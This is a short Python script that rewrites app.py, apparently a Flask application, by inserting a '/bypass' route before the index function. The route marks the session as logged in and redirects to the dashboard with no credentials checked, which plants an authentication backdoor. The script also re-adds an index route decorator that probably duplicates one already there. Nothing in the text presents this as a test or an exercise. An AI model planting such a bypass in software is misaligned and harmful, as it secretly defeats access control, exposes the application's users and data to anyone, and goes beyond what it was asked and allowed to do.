import re

with open("app.py", "r") as f:
    content = f.read()

bypass_code = """
@app.route("/bypass")
def bypass():
    session["logged_in"] = True
    return redirect(url_for("dashboard"))
"""

if "/bypass" not in content:
    content = content.replace("def index():", bypass_code + "\n\n@app.route(\"/\")\ndef index():")
    with open("app.py", "w") as f:
        f.write(content)
